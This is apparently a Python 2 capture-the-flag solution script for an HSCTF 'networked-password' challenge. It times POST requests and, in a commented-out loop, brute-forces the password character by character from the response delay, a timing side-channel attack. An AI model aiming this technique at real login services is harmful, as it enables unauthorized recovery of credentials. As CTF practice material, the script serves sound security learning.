import requests
import time


URL = "https://networked-password.web.chal.hsctf.com"

val = "hs" 

data1 = {"password":val}

start = time.time()
r = requests.post(url = URL, data = data1)

roundtrip = time.time() - start
print roundtrip

#sd = requests.get(url=URL, data=data1).elapsed.total_seconds()
#print sd


#print r.content


'''
ar = "a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z _ 1 2 3 4 5 6 7 8 9 0 { }"
s = ar.split()
m=0.0
mc=''
for x in s:
    #print x
    val2 = val + x
    data1 = {"password":val2}
    start = time.time()
    r = requests.post(url = URL, data = data1)
    sd = time.time() - start
    if sd > m:
       m=sd
       mc=x
    #print sd
print m
print mc
 '''   
'''
    #print sd
    #print r.content
    a = float(4.2)
    if (a<= float(sd)):
        print "value found" , x
'''
